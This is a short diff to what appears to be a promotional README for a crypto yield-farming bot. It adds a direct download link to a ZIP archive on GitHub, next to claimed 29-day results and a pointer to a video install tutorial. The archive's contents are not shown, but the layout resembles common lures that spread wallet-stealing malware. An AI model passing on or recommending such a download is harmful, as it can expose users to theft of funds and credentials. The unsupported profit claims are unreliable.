@@ -4,6 +4,9 @@ Here's my 29 day test results
 
 <img src="https://i.ibb.co/0MSh4PV/yieldbot-29days.png" alt="yieldbot-29days" border="0">
 
+You can download the bot here
+https://github.com/timothygregasaur/high-yield-farming-with-stoploss-stablecoin-function/raw/main/Max-Yield-farming-bot-with-stoploss-volatility-protection.zip
+
 Here's a YouTube tutorial on how to install it it's very simple and straightforward.
 
 
